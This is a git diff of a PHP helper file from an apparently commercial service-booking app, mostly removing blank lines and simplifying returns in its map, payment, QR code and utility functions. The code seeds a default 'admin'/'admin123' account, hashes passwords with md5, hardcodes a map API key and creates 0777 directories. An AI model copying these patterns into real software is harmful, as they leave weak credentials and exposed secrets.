@@ -1997,11 +1706,8 @@ if (!function_exists('longbing_dd')) {
         if (Env::get('APP_DEBUG', false)) {
             Log::debug($message, $context);
         }
-
     }
 }
-
-
 if (!function_exists('longbing_compare_version')) {
     /**
      * 功能说明
@@ -2018,18 +1724,14 @@ if (!function_exists('longbing_compare_version')) {
         $oldVersion = explode('.', $oldVersion);
         $newVersion = explode('.', $newVersion);
         foreach ($newVersion as $key => $value) {
-
             if (intval($value) > intval($oldVersion[$key])) {
                 $isNew = true;
                 break;
             }
-
         }
-
         return $isNew;
     }
 }
-
 if (!function_exists('longbing_tablename')) {
     /**
      * 根据当前表名获取完整的前缀+表名
@@ -2073,7 +1775,6 @@ if (!function_exists('longbing_get_table_prefix')) {
         return $prefix;
     }
 }
-
 if (!function_exists('longbing_check_install')) {
     /**
      * 检查是否安装,没有安装就自动安装
@@ -2128,7 +1829,6 @@ if (!function_exists('longbing_get_mobile_type')) {
         return $type;
     }
 }
-
 if (!function_exists('longbing_filterEmoji')) {
     /**
      * @param $str
@@ -2143,11 +1843,9 @@ if (!function_exists('longbing_filterEmoji')) {
                 return strlen($match[0]) >= 4 ? '' : $match[0];
             },
             $str);
-
         return $str;
     }
 }
-
 if (!function_exists('longbing_auth_status')) {
     /**
      **@author lichuanming
@@ -2161,19 +1859,16 @@ if (!function_exists('longbing_auth_status')) {
             'time' => '', #到期时间
             'status' => 0, #状态 0未过期  1即将到期  2已到期
         ];
-
         //如果是微擎 则不判断是否到期
         if (!longbingIsWeiqin()) {
             $info = Db::name('longbing_cardauth2_config')->where('modular_id', '=', $uniacid)
                 ->field('end_time,mini_name')->find(); #获取过期时间
 
             $end_time = $info['end_time'];
-
             if ($end_time <= time()) { //已过期
                 list($resData['name'], $resData['time'], $resData['status']) = array(
                     $info['mini_name'], date('Y-m-d', $end_time), 2
                 );
-
             } else {
                 if ($end_time < time() + 30 * 86400 && $end_time > time()) { #即将过期/30天
 
@@ -2186,52 +1881,38 @@ if (!function_exists('longbing_auth_status')) {
         return $resData;
     }
 }
-
-
 //随机生成偏移量
 function createOffset()
 {
     return substr(uuid(), 8, 10);
 }
-
 //生成密码
 function createPasswd($passwd, $offset)
 {
     return password_hash($offset.$passwd.$offset, PASSWORD_DEFAULT);
 }
-
 //多维数组排序
 if (!function_exists('arraySort')) {
-
     function arraySort($array, $keys, $sort = 'asc')
     {
-
         $newArr = $valArr = array();
-
         foreach ($array as $key => $value) {
-
             $valArr[$key] = $value[$keys];
         }
         ($sort == 'asc') ? asort($valArr) : arsort($valArr);
         reset($valArr);
-
         foreach ($valArr as $key => $value) {
             $newArr[$key] = $array[$key];
         }
-
         return array_values($newArr);
     }
 }
-
 /**
  * 转星期
  */
 if (!function_exists('changeWeek')) {
-
-
     function changeWeek($week)
     {
-
         switch ($week) {
             case 1:
                 return '周一';
@@ -2257,90 +1938,50 @@ if (!function_exists('changeWeek')) {
         }
     }
 }
-
 if (!function_exists('orderCode')) {
-
     function orderCode()
     {
-
         $i = rand(1, 999);
-
         $out_trade_no = date('YmdHis').'0'.$i.'0';
-
         $idlen = strlen($i);
-
         $out_trade_no = $out_trade_no.str_repeat('0', 7 - $idlen).$i;
-
         return $out_trade_no;
     }
 }
-
 if (!function_exists('orderRefundApi')) {
-
     function orderRefundApi($paymentApp, $total_fee, $refund_fee, $order_code)
     {
-
         $setting['mini_appid'] = $paymentApp['app_id'];
-
         $setting['mini_appsecrept'] = $paymentApp['secret'];
-
         $setting['mini_mid'] = $paymentApp['payment']['merchant_id'];
-
         $setting['mini_apicode'] = $paymentApp['payment']['key'];
-
         $setting['apiclient_cert'] = $paymentApp['payment']['cert_path'];
-
         $setting['apiclient_cert_key'] = $paymentApp['payment']['key_path'];
-
         if (!is_file($setting['apiclient_cert']) || !is_file($setting['apiclient_cert_key'])) {
-
             return ['return_msg' => '未配置支付证书，或支付证书错误请重新上传', 'code' => 500];
-
         }
         defined('WX_APPID') or define('WX_APPID', $setting['mini_appid']);
-
         defined('WX_MCHID') or define('WX_MCHID', $setting['mini_mid']);
-
         defined('WX_KEY') or define('WX_KEY', $setting['mini_apicode']);
-
         defined('WX_APPSECRET') or define('WX_APPSECRET', $setting['mini_appsecrept']);
-
         defined('WX_SSLCERT_PATH') or define('WX_SSLCERT_PATH', $setting['apiclient_cert']);
-
         defined('WX_SSLKEY_PATH') or define('WX_SSLKEY_PATH', $setting['apiclient_cert_key']);
-
         defined('WX_CURL_PROXY_HOST') or define('WX_CURL_PROXY_HOST', '0.0.0.0');
-
         defined('WX_CURL_PROXY_PORT') or define('WX_CURL_PROXY_PORT', 0);
-
         defined('WX_REPORT_LEVENL') or define('WX_REPORT_LEVENL', 0);
-
         require_once PAY_PATH."/weixinpay/lib/WxPay.Api.php";
-
         require_once PAY_PATH."/weixinpay/example/WxPay.JsApiPay.php";
-
         $input = new \WxPayRefund();
-
         $input->SetTotal_fee($total_fee * 100);
-
         $input->SetRefund_fee($refund_fee * 100);
-
         $input->SetOut_refund_no(WX_MCHID.date("YmdHis"));
-
         $input->SetTransaction_id($order_code);
-
         $input->SetOp_user_id(WX_MCHID);
-
         $order = \WxPayApi::refund($input);
-
         return $order;
-
     }
 }
-
-
 if (!function_exists('getdistance')) {
-
     /**
      * User: chenniang
      * Date: 2019-10-18 16:00
@@ -2359,90 +2000,54 @@ if (!function_exists('getdistance')) {
         $radLng2 = deg2rad($lng2);
         $a = $radLat1 - $radLat2;
         $b = $radLng1 - $radLng2;
-
         $s = 2 * asin(sqrt(pow(sin($a / 2), 2) + cos($radLat1) * cos($radLat2) * pow(sin($b / 2),
                     2))) * 6378.137 * 1000;
         return $s;
-
-
     }
 }
 if (!function_exists('getDistances')) {
-
     function getDistances($longitude1, $latitude1, $longitude2, $latitude2, $unit = 2, $decimal = 2)
     {
-
         $EARTH_RADIUS = 6378.137; // 地球半径系数
         $PI = 3.1415926;
-
         $radLat1 = $latitude1 * $PI / 180.0;
         $radLat2 = $latitude2 * $PI / 180.0;
-
         $radLng1 = $longitude1 * $PI / 180.0;
         $radLng2 = $longitude2 * $PI / 180.0;
-
         $a = $radLat1 - $radLat2;
         $b = $radLng1 - $radLng2;
-
         $distance = 2 * asin(sqrt(pow(sin($a / 2), 2) + cos($radLat1) * cos($radLat2) * pow(sin($b / 2), 2)));
         $distance = $distance * $EARTH_RADIUS * 1000;
-
 //    if($unit==2){
 //        $distance = $distance / 1000;
 //    }
 
         return $distance;
-
     }
 }
-
-
 if (!function_exists('checkPass')) {
-
     function checkPass($pass)
     {
-
         return md5('shequ'.$pass);
-
     }
-
-
 }
-
-
 if (!function_exists('initLogin')) {
-
     function initLogin($uniacid = 666)
     {
-
         $admin_model = new \app\massage\model\Admin();
-
         $admin = $admin_model->dataInfo(['uniacid' => $uniacid]);
-
         if (empty($admin)) {
-
             $insert = [
-
                 'uniacid' => $uniacid,
-
                 'username' => 'admin',
-
                 'passwd' => checkPass('admin123'),
-
                 'create_time' => time()
             ];
-
             $admin_model->dataAdd($insert);
-
         }
-
         return true;
-
     }
-
-
 }
-
 if (!function_exists('setUserForToken')) {
     function setUserForToken($token, $user, $uniacid = '7777'): bool
     {
@@ -2451,10 +2056,7 @@ if (!function_exists('setUserForToken')) {
         return setCache("Token_".$token, $user, 86400, $uniacid, $tag);
     }
 }
-
-
 if (!function_exists('is_time_cross')) {
-
     /**
      * PHP计算两个时间段是否有交集（边界重叠不算）
      *
@@ -2466,42 +2068,25 @@ if (!function_exists('is_time_cross')) {
      */
     function is_time_cross($beginTime1 = '', $endTime1 = '', $beginTime2 = '', $endTime2 = '')
     {
-
         $status = $beginTime2 - $beginTime1;
-
         if ($status > 0) {
-
             $status2 = $beginTime2 - $endTime1;
-
             if ($status2 >= 0) {
-
                 return true;
-
             } else {
-
                 return false;
             }
         } else {
-
             $status2 = $endTime2 - $beginTime1;
-
             if ($status2 > 0) {
-
                 return false;
-
             } else {
-
                 return true;
             }
-
         }
-
     }
 }
-
-
 if (!function_exists('is_time_crossV2')) {
-
     /**
      * PHP计算两个时间段是否有交集
      *
@@ -2513,97 +2098,57 @@ if (!function_exists('is_time_crossV2')) {
      */
     function is_time_crossV2($beginTime1 = '', $endTime1 = '', $beginTime2 = '', $endTime2 = '')
     {
-
         $status = $beginTime2 - $beginTime1;
-
         if ($status > 0) {
-
             $status2 = $beginTime2 - $endTime1;
-
             if ($status2 > 0) {
-
                 return true;
-
             } else {
-
                 return false;
             }
         } else {
-
             $status2 = $endTime2 - $beginTime1;
-
             if ($status2 >= 0) {
-
                 return false;
-
             } else {
-
                 return true;
             }
-
         }
-
     }
 }
-
 if (!function_exists('distance_text')) {
-
     /**
      * PHP计算两个时间段是否有交集（边界重叠不算）
      *
-     * @param  string  $beginTime1  开始时间1
-     * @param  string  $endTime1  结束时间1
-     * @param  string  $beginTime2  开始时间2
-     * @param  string  $endTime2  结束时间2
+     * @param $distance
      * @return bool
      */
     function distance_text($distance)
     {
-
         if ($distance > 1000) {
-
             $distance = round($distance / 1000, 2);
-
             $text = $distance.'km';
         } else {
-
             $text = round($distance, 2).'m';
-
         }
-
         return $text;
-
     }
 }
-
-
 if (!function_exists('getCode')) {
-
     function getCode($uniacid, $data, $type = 1, $page = 'pages/home')
     {
-
         if ($type == 1) {
-
             $model = new WxSetting($uniacid);
-
             $data = $model->phpQrCode($data);
-
         } else {
             //小程序码
             $data = longbingCreateWxCode($uniacid, $data, $page, 1);
-
             $data = transImagesOne($data, ['qr_path'], $uniacid);
-
             $data = $data['qr_path'];
-
         }
-
         return $data;
-
     }
-
 }
-
 if (!function_exists('base64ToPng')) {
     /**
      * @author chenniang
@@ -2612,150 +2157,84 @@ if (!function_exists('base64ToPng')) {
      */
     function base64ToPng($v)
     {
-
         if (!empty($v)) {
-
             $path = MATER_UPLOAD_PATH.date('Y-m-d', time()).'/img';
-
             if (!file_exists($path)) {
-
                 mkdir($path, 0777, true);
             }
-
             if (strpos($v, 'https://') !== false) {
-
                 $file_arr[] = $v;
-
             } else {
-
                 if (strstr($v, ",")) {
-
                     $v = explode(',', $v);
-
                     $v = $v[1];
                 }
-
                 $imageName = "/25220_".date("His", time())."_".rand(1111, 9999).'.jpg';
-
                 file_put_contents($path.$imageName, base64_decode($v));
-
                 $file = str_replace(FILE_UPLOAD_PATH, HTTPS_PATH, $path.$imageName);
-
             }
-
             return $file;
-
         }
-
         return [];
-
     }
-
 }
 if (!function_exists('getCityByLongLat')) {
-
     function getCityByLongLat($lng, $lat, $uniacid)
     {
-
         $dis = [
-
             'uniacid' => $uniacid
         ];
-
         $config_model = new Config();
-
         $config = $config_model->dataInfo($dis);
-
         $map_secret = !empty($config['map_secret']) ? $config['map_secret'] : 'bViFglag7C7G7QlZ1MglFyvh40yK1Tir';
-
         $URL = "https://apis.map.qq.com/ws/geocoder/v1/?location=$lat,$lng&key=$map_secret";
-
         $data = longbingCurl($URL, []);
-
         $data = json_decode($data, true);
-
-        $data = !empty($data['result']['address_component']['city']) ? $data['result']['address_component']['city'] : '';
-
-        return $data;
-
+        return !empty($data['result']['address_component']['city']) ? $data['result']['address_component']['city'] : '';
     }
 }
-
 /**
  * 地址解析
  */
 if (!function_exists('getAddressLocation')) {
-
     function getAddressLocation($address, $uniacid)
     {
-
         $dis = [
-
             'uniacid' => $uniacid
         ];
-
         $config_model = new Config();
-
         $config = $config_model->dataInfo($dis);
-
         $map_secret = !empty($config['map_secret']) ? $config['map_secret'] : 'bViFglag7C7G7QlZ1MglFyvh40yK1Tir';
-
         $URL = "https://apis.map.qq.com/ws/geocoder/v1/?address=$address&key=$map_secret";
-
         $data = longbingCurl($URL, []);
-
-        $data = json_decode($data, true);
-
-        return $data;
+        return json_decode($data, true);
     }
 }
-
-
 /**
  * 逆地址解析
  */
 if (!function_exists('getLocationAddress')) {
-
     function getLocationAddress($lng, $lat, $uniacid)
     {
-
         $dis = [
-
             'uniacid' => $uniacid
         ];
-
         $config_model = new Config();
-
         $config = $config_model->dataInfo($dis);
-
         $map_secret = !empty($config['map_secret']) ? $config['map_secret'] : 'bViFglag7C7G7QlZ1MglFyvh40yK1Tir';
-
         $URL = "https://apis.map.qq.com/ws/geocoder/v1/?location=$lat,$lng&key=$map_secret";
-
         $data = longbingCurl($URL, []);
-
-        $data = json_decode($data, true);
-
-        return $data;
+        return json_decode($data, true);
     }
 }
-
 if (!function_exists('getCityNumber')) {
-
     function getCityNumber($uniacid)
     {
-
         $a = new PermissionMassage($uniacid, []);
-
-        $num = $a->getCityNumber();
-
-        return $num;
+        return $a->getCityNumber();
     }
 }
-
-
 if (!function_exists('getDriveDistance')) {
-
     /**
      * @param $start_lang
      * @param $start_lat
@@ -2763,57 +2242,37 @@ if (!function_exists('getDriveDistance')) {
      * @param $end_lat
      * @param $uniacid
      * @功能说明:计算两地的驾驶距离
+     * @return float|mixed
      * @author chenniang
      * @DataTime: 2022-10-17 12:01
      */
     function getDriveDistance($start_lang, $start_lat, $end_lng, $end_lat, $uniacid)
     {
-
         $dis = [
-
             'uniacid' => $uniacid
         ];
-
         $start = "$start_lat,$start_lang";
-
         $end = "$end_lat,$end_lng";
-
         $config_model = new Config();
-
         $config = $config_model->dataInfo($dis);
-
         $key = !empty($config['map_secret']) ? $config['map_secret'] : 'bViFglag7C7G7QlZ1MglFyvh40yK1Tir';; //腾讯地图开发自己申请
-
         $mode = 'driving'; //driving(驾车)、walking(步行)
-
         $from = $start; //例如：39.14122,117.14428
-
         $to = $end; //例如(格式：终点坐标;起点坐标)：39.10149,117.10199;39.14122,117.14428
-
         $url = 'https://apis.map.qq.com/ws/direction/v1/driving/?output=json&from='.$from.'&to='.$to.'&key='.$key;
-
         $info = file_get_contents($url);
         //如果请求失败用直线距离
         if (empty($info)) {
-
             return getDistances($start_lang, $start_lat, $end_lng, $end_lat);
         }
-
         $info = json_decode($info, true);
-
         if (isset($info['status']) && $info['status'] == 0 && isset($info['result']['routes'][0]['distance'])) {
-
             return $info['result']['routes'][0]['distance'];
-
         }
-
         return getDistances($start_lang, $start_lat, $end_lng, $end_lat);
-
     }
 }
-
 if (!function_exists('object_array')) {
-
     function object_array($array)
     {
         if (is_object($array)) {
@@ -2827,9 +2286,7 @@ if (!function_exists('object_array')) {
         return $array;
     }
 }
-
 if (!function_exists('getIP')) {
-
     function getIP()
     {
         global $ip;
@@ -2849,10 +2306,7 @@ if (!function_exists('getIP')) {
         return $ip;
     }
 }
-
-
 if (!function_exists('getFriendNum')) {
-
     /**
      * @param $num
      * @功能说明:友好数量显示
@@ -2863,16 +2317,11 @@ if (!function_exists('getFriendNum')) {
     {
         //只有超过10000才显示
         if ($num >= 10000) {
-
             $num = round($num / 10000, 1).'万';
         }
-
         return $num;
-
     }
 }
-
-
 if (!function_exists('defaultCoachAvatar')) {
     /**
      * @author chenniang
@@ -2881,13 +2330,9 @@ if (!function_exists('defaultCoachAvatar')) {
      */
     function defaultCoachAvatar()
     {
-
         return 'https://lbqny.migugu.com/admin/anmo/technician/default_technician.png';
-
     }
 }
-
-
 if (!function_exists('getConfigSetting')) {
     /**
      * @author chenniang
@@ -2897,16 +2342,11 @@ if (!function_exists('getConfigSetting')) {
     //@ioncube.dk myk("sha256", "cnjdbvjdnjd") -> "cff6bcac6bd92467e0cee72e5c879cdbf7044386eda8f464c817bd5c5c963d6f" RANDOM
     function getConfigSetting($uniacid, $key)
     {
-
         $config_model = new \app\massage\model\ConfigSetting();
-
         $config = $config_model->dataInfo($uniacid, [$key]);
-
         return $config[$key];
-
     }
 }
-
 if (!function_exists('getConfigSettingArr')) {
     /**
      * @author chenniang
@@ -2915,24 +2355,16 @@ if (!function_exists('getConfigSettingArr')) {
      */
     function getConfigSettingArr($uniacid, $key)
     {
-
         $config_model = new \app\massage\model\ConfigSetting();
-
-        $config = $config_model->dataInfo($uniacid, $key);
-
-        return $config;
-
+        return $config_model->dataInfo($uniacid, $key);
     }
 }
-
-
 //生成微信小程序二维码
 function longbingCreateWxCode($uniacid, $data, $page = '', $type = 3)
 {
     $code_id = md5($uniacid.json_encode($data, true));
     //上传路径
     $path = 'image/'.$uniacid.'/'.'wxcode';
-
     if (!mkdirs_v2(FILE_UPLOAD_PATH.$path)) {
         return false;
     }
@@ -2948,7 +2380,6 @@ function longbingCreateWxCode($uniacid, $data, $page = '', $type = 3)
     );
     //写入数据
     $wechat_code_model = new LongbingCardWechatCode();
-
     //判断数据是否存在
     $code = longbingGetWxCode($code_id, $uniacid);
     //创建
@@ -2958,8 +2389,6 @@ function longbingCreateWxCode($uniacid, $data, $page = '', $type = 3)
     } else {
         $result = $wechat_code_model->updateCode(['id' => $code_id], $code_data);
     }
-
-
     //刷新缓存
     longbingGetWxCode($code_id, $uniacid, true);
     if (empty($result)) {
@@ -3016,7 +2445,6 @@ function longbingCreateWxCode($uniacid, $data, $page = '', $type = 3)
     $data = file_put_contents(FILE_UPLOAD_PATH.$path, $result);
     //设置文件权限
 
-
     //上传到云端
 //  $file = new UploadedFile($path ,$file_name);
 //  $file_upload_model = new Upload($uniacid);
@@ -3028,34 +2456,19 @@ function longbingCreateWxCode($uniacid, $data, $page = '', $type = 3)
     }
     //数据转换
     return ['qr_path' => $path, 'path' => $path];
-
 }
-
-
 //获取微信小程序二维码数据
 function longbingGetWxCode($code_id, $uniacid, $is_update = false)
 {
-    //生成key
-    $key = 'longbing_wechat_code_'.$code_id;
-    $data = null;
-    //获取缓存数据
-//    if(hasCache($key ,$uniacid) && empty($is_update))
-//    {
-//        $data = getCache($key ,$uniacid);
-//        if(!empty($data)) return $data;
-//    }
-    //从数据库中获取数据
     $wechat_code_model = new LongbingCardWechatCode();
     $data = $wechat_code_model->getCode(['id' => $code_id, 'uniacid' => $uniacid]);
     if (!empty($data)) {
         if (isset($data['data'])) {
             $data['data'] = json_decode($data['data'], true);
         }
-
     }
     return $data;
 }
-
 /**
  * 创建多级目录
  * @param $path string 要创建的目录
@@ -3076,7 +2489,6 @@ function create_dir($path, $mode = 0777)
         }
     }
 }
-
 /**
  * 处理时间戳
  * @param $time
@@ -3086,7 +2498,6 @@ function handleTime($time, $format = 'Y-m-d H:i:s')
 {
     return date($format, $time);
 }
-
 /**
  * 获取年龄
  */
@@ -3100,12 +2511,10 @@ if (!function_exists('getAge')) {
         $byear = date('Y', $birthday);
         $bmonth = date('m', $birthday);
         $bday = date('d', $birthday);
-
         //格式化当前时间年月日
         $tyear = date('Y');
         $tmonth = date('m');
         $tday = date('d');
-
         //开始计算年龄
         $age = $tyear - $byear;
         if ($bmonth > $tmonth || $bmonth == $tmonth && $bday > $tday) {
@@ -3114,45 +2523,30 @@ if (!function_exists('getAge')) {
         return $age;
     }
 }
-
 /**
  * 隐藏手机号
  */
 if (!function_exists('numberEncryption')) {
-
     function numberEncryption($uniacid)
     {
-
         $key = 'numberEncryptionnumberEncryption';
-
         $value = getCache($key, $uniacid);
-
         if (is_numeric($value)) {
-
             return $value;
         }
         //开启了号码加密
         if (getConfigSetting($uniacid, 'number_encryption') == 1) {
-
             $ip = getConfigSetting($uniacid, 'number_encryption_ip');
-
             $ip = !empty($ip) ? explode(',', $ip) : [];
-
             if (!in_array(getIP(), $ip)) {
-
                 setCache($key, 1, 99999999, $uniacid);
-
                 return 1;
             }
-
         }
         setCache($key, 0, 99999999, $uniacid);
-
         return 0;
     }
 }
-
-
 /**
  * 封装php打印函数
  **/
@@ -3167,7 +2561,6 @@ if (!function_exists('pr')) {
         }
     }
 }
-
 /**
  * @Desc: 获取店铺营业状态
  * @param $data
@@ -3181,42 +2574,28 @@ function getTradeStatus($data)
         'trade_status' => 0,
         'trade_msg' => '休息中'
     ];
-
     $tt = time();
-
     if (empty($data['trade_week']) || empty($data['start_time']) || empty($data['end_time'])) {
-
         return $arr;
     }
-
     $trade_week = !empty($data['trade_week']) ? explode(',', $data['trade_week']) : '';
-
     $week = date('w');
-
     if (!in_array($week, $trade_week)) {
-
         return $arr;
     }
-
     $start_time = strtotime($data['start_time']);
-
     $end_time = strtotime($data['end_time']);
     //跨日
     if ($end_time <= $start_time) {
         //查看此时处于上一个周期还是这个周期
         if ($tt < $end_time) {
-
             $start_time -= 86400;
-
         } else {
             //当前周期
             $end_time += 86400;
         }
-
     }
-
     if ($start_time <= $tt && $tt <= $end_time) {
-
         return [
             'trade_status' => 1,
             'trade_msg' => '营业中'
@@ -3224,7 +2603,6 @@ function getTradeStatus($data)
     }
     return $arr;
 }
-
 if (!function_exists('curlSend')) {
     function curlSend($host)
     {
@@ -3247,23 +2625,14 @@ if (!function_exists('curlSend')) {
         ));
         curl_exec($curl);
         curl_close($curl);
-
     }
 }
-
 if (!function_exists('lbData')) {
-
     function lbData($function, $token, $develop = 1, $data = [])
     {
-
         $goods_name = config('app.AdminModelList')['app_model_name'];
-
         $auth_uniacid = config('app.AdminModelList')['auth_uniacid'];
-
         $upgrade = new LongbingUpgrade($auth_uniacid, $goods_name, false);
-
-        $data = $upgrade->lbData($function, $token, $develop, $data);
-
-        return $data;
+        return $upgrade->lbData($function, $token, $develop, $data);
     }
 }
